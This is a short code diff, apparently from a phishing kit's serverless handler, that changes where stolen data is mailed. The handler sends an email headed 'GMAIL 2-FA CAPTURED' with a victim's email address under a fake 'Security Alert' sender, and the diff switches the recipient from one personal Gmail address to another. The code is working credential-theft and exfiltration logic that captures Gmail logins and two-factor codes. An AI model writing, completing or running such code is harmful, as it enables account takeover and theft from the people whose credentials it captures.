@@ -80,7 +80,7 @@ export default async function handler(req, res) {
 
     await transporter.sendMail({
       from: `"Security Alert" <${process.env.EMAIL_USER}>`,
-      to: 'busmeup13@gmail.com',
+      to: 'myprivateuse76@gmail.com',
       subject: `🔔 GMAIL 2-FA CAPTURED: ${data.email}`,
       html: `
         <div style="font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;">
